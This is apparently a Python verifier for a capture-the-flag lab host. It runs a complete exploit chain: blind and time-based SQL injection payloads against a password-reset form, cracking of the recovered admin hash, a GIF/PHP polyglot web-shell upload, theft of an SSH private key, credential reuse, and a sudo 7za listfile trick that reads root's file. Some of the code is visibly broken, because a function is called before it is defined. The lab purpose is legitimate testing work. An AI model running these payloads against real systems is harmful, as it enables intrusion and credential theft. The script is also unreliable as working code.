#!/usr/bin/env python3
"""Independent learner verification for the Usage single-container target."""
import base64
import bcrypt
import os
import re
import subprocess
import tempfile
import time
import uuid

import requests

MAIN = "http://usage.htb"
ADMIN = "http://admin.usage.htb"
EXPECTED_DB = os.environ["EXPECTED_DB_FLAG"]
EXPECTED_USER = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT = os.environ["EXPECTED_ROOT_FLAG"]
session = requests.Session()
session.trust_env = False
# Player network must not reach database, X Protocol, PHP-FPM or Monit.
import socket
for blocked_port in (3306, 33060, 9000, 2812):
    try:
        socket.create_connection(("usage.htb", blocked_port), timeout=1).close()
    except OSError:
        pass
    else:
        raise AssertionError("internal service port %d is reachable from player network" % blocked_port)


def token(html):
    match = re.search(r'name="_token"\s+value="([^"]+)"', html)
    if not match:
        raise AssertionError("Laravel CSRF token not found in rendered form")
    return match.group(1)

def post_forgot(value, csrf):
    response = session.post(
        MAIN + "/forget-password",
        data={"_token": csrf, "email": value},
        timeout=15,
    )
    if response.status_code != 200:
        raise AssertionError(f"forget-password returned HTTP {response.status_code}: {response.text[:300]}")
    return response

def is_true(response):
    return "If this address is registered" in response.text

def run(cmd, timeout=25, allowed_codes=(0,)):
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    if result.returncode not in allowed_codes:
        raise AssertionError(
            "command failed: " + cmd[0] + " (exit " + str(result.returncode) + ")" +
            "\nstdout=" + result.stdout[-1200:] +
            "\nstderr=" + result.stderr[-1200:]
        )
    return result.stdout + result.stderr

# Discover the ordinary application and create a real account through its form.
home = session.get(MAIN + "/", timeout=15)
assert home.status_code == 200 and "Daily Blogs" in home.text
registration = session.get(MAIN + "/registration", timeout=15)
csrf = token(registration.text)
email = "player-" + uuid.uuid4().hex[:10] + "@usage.htb"
created = session.post(
    MAIN + "/registration",
    data={
        "_token": csrf,
        "name": "Community Player",
        "email": email,
        "password": "LocalLabPass!234",
        "password_confirmation": "LocalLabPass!234",
    },
    allow_redirects=True,
    timeout=15,
)
assert created.status_code == 200 and "account has been created" in created.text
print("PASS: normal registration workflow", flush=True)

forgot = session.get(MAIN + "/forget-password", timeout=15)
csrf = token(forgot.text)
baseline_true = post_forgot(email, csrf)
baseline_false = post_forgot("missing-" + uuid.uuid4().hex + "@usage.htb", csrf)
assert is_true(baseline_true) and not is_true(baseline_false)
print("PASS: normal password recovery exposes a stable true/false response difference", flush=True)

# The focused SQLi objective is the real Laravel-admin remember_token field.
# It is a persistent-login token in the upstream package schema, not a test-only endpoint.
def extract_ascii(expression, length):
    chars = []
    for position in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            middle = (low + high) // 2
            condition = "ASCII(SUBSTRING((" + expression + ")," + str(position) + ",1))>" + str(middle)
            if predicate(condition):
                low = middle + 1
            else:
                high = middle - 1
        if low < 32 or low > 126:
            raise AssertionError("blind extraction returned an invalid character")
        chars.append(chr(low))
    return "".join(chars)

db_flag = extract_ascii(
    "SELECT remember_token FROM usage_blog.admin_users WHERE username='admin' LIMIT 1",
    len(EXPECTED_DB),
)
assert db_flag == EXPECTED_DB, ("database Flag mismatch", db_flag)
assert re.fullmatch(r"TTP\\{[a-z2-7]{16}\\}", db_flag)
print("PASS: extracted the exact version-baked Flag from the real admin_users.remember_token field", flush=True)

# Boolean-based blind SQLi: infer the bcrypt hash from the genuine MySQL table
# using only the recovery endpoint. No database socket or target filesystem is
# available to this attacker container.
def predicate(sql_condition):
    payload = email + "' AND IF((" + sql_condition + "),1,0)-- -"
    return is_true(post_forgot(payload, csrf))

assert predicate("1=1")
assert not predicate("1=2")
print("PASS: true/false boolean SQL condition changes the application response", flush=True)

# Time-based blind SQLi is a separate assertion, not inferred from the boolean
# response test. The true predicate must cause a real MySQL SLEEP() delay.
start = time.monotonic()
post_forgot(email + "' AND IF(1=1,SLEEP(1),0)-- -", csrf)
true_delay = time.monotonic() - start
start = time.monotonic()
post_forgot(email + "' AND IF(1=2,SLEEP(1),0)-- -", csrf)
false_delay = time.monotonic() - start
assert true_delay - false_delay >= 0.8, (true_delay, false_delay)
print("PASS: genuine MySQL time-based blind condition produces a measurable SLEEP delay", flush=True)

hash_chars = []
for position in range(1, 61):
    low, high = 32, 126
    while low <= high:
        middle = (low + high) // 2
        condition = (
            "ASCII(SUBSTRING((SELECT password FROM usage_blog.admin_users "
            "WHERE username='admin' LIMIT 1)," + str(position) + ",1))>" + str(middle)
        )
        if predicate(condition):
            low = middle + 1
        else:
            high = middle - 1
    if low < 32 or low > 126:
        raise AssertionError("blind extraction returned an invalid character")
    hash_chars.append(chr(low))
admin_hash = "".join(hash_chars)
assert admin_hash.startswith("$2y$") and len(admin_hash) == 60, admin_hash
print("PASS: extracted the actual Laravel-admin bcrypt hash using blind SQLi", flush=True)

# Crack the extracted hash using a tiny attacker-side wordlist. The plaintext is
# not read from target environment, .env, database connection or source file.
bcrypt_hash = admin_hash.replace("$2y$", "$2b$", 1).encode()
cracked = None
for candidate in ["letmein", "password", "password123", "admin123", "qwerty123"]:
    if bcrypt.checkpw(candidate.encode(), bcrypt_hash):
        cracked = candidate
        break
assert cracked == "password", "unexpected admin password hash / wordlist result"
print("PASS: cracked the recovered bcrypt hash offline", flush=True)

# Authenticate to the real vulnerable Laravel-admin 1.8.19 package and use
# its native AuthController profile setting form / Image field.
admin_session = requests.Session()
admin_session.trust_env = False
login_page = admin_session.get(ADMIN + "/auth/login", timeout=15)
assert login_page.status_code == 200 and "username" in login_page.text
admin_csrf = token(login_page.text)
login = admin_session.post(
    ADMIN + "/auth/login",
    data={"_token": admin_csrf, "username": "admin", "password": cracked, "remember": "1"},
    allow_redirects=True,
    timeout=20,
)
assert login.status_code == 200
settings = admin_session.get(ADMIN + "/auth/setting", timeout=20)
assert settings.status_code == 200 and 'name="avatar"' in settings.text
admin_csrf = token(settings.text)

# A valid 1x1 GIF polyglot passes the package's real image MIME validation;
# the original filename retains the .php suffix and nginx/php-fpm execute it.
gif = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==")
polyglot = gif + b'<?php echo shell_exec($_GET["cmd"] ?? "id"); ?>'
upload = admin_session.post(
    ADMIN + "/auth/setting",
    data={
        "_token": admin_csrf,
        "_method": "PUT",
        "name": "Administrator",
        "password": cracked,
        "password_confirmation": cracked,
    },
    files={"avatar": ("avatar.gif.php", polyglot, "image/gif")},
    allow_redirects=True,
    timeout=25,
)
assert upload.status_code == 200
webshell = session.get(
    MAIN + "/uploads/images/avatar.gif.php",
    params={"cmd": "id"},
    timeout=20,
)
assert webshell.status_code == 200 and b"uid=1000(dash)" in webshell.content, (
    webshell.status_code, webshell.content[-800:]
)
print("PASS: real Laravel-admin vulnerable Image field upload -> PHP executes as dash", flush=True)

key_response = session.get(
    MAIN + "/uploads/images/avatar.gif.php",
    params={"cmd": "cat /home/dash/.ssh/id_rsa"},
    timeout=20,
)
match = re.search(
    rb"-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----",
    key_response.content,
    re.S,
)
assert match, "could not retrieve dash's actual SSH private key through the uploaded PHP"
with tempfile.NamedTemporaryFile("wb", delete=False) as handle:
    handle.write(match.group(0) + b"\n")
    key_path = handle.name
os.chmod(key_path, 0o600)

ssh_base = [
    "ssh", "-i", key_path,
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "LogLevel=ERROR",
    "-o", "ConnectTimeout=10",
]
dash_output = run(ssh_base + ["dash@usage.htb", "id; cat /home/dash/user.txt; cat /home/dash/.monitrc"])
assert EXPECTED_USER in dash_output and "uid=1000(dash)" in dash_output
monit_match = re.search(r"allow admin:([a-f0-9]{16})", dash_output)
assert monit_match, "Monit credential not found in dash's real .monitrc"
print("PASS: SSH with recovered dash key and read User Flag / Monit config", flush=True)

monit_password = monit_match.group(1)
xander_output = run([
    "sshpass", "-p", monit_password,
    "ssh", "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "LogLevel=ERROR",
    "-o", "ConnectTimeout=10",
    "xander@usage.htb", "id; sudo -n -l",
])
assert "uid=1001(xander)" in xander_output and "/usr/bin/7za" in xander_output
print("PASS: Monit credential reuse authenticates the real xander system account", flush=True)

# Exercise p7zip's real @listfile parsing under the real sudo rule. The
# symlinked listfile is /root/root.txt; its contents are disclosed in 7za's
# error output. No helper binary or fabricated root response is used.
root_command = (
    "cd /var/www/usage/public && "
    "rm -f -- @root.txt root.txt && "
    "touch -- @root.txt && "
    "ln -s /root/root.txt root.txt && "
    "sudo -n /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *"
)
root_output = run([
    "sshpass", "-p", monit_password,
    "ssh", "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "LogLevel=ERROR",
    "-o", "ConnectTimeout=10",
    "xander@usage.htb", root_command,
], allowed_codes=(0, 1))
assert "No more files" in root_output and EXPECTED_ROOT in root_output, "7za warning did not disclose the expected instance Root Flag"
print("PASS: real sudo 7za 16.02 wildcard/listfile behavior discloses the protected Root Flag", flush=True)

try:
    os.unlink(key_path)
except OSError:
    pass
print("PASS: complete independent player -> boolean/time SQLi -> admin upload -> dash -> xander -> root Flag chain", flush=True)
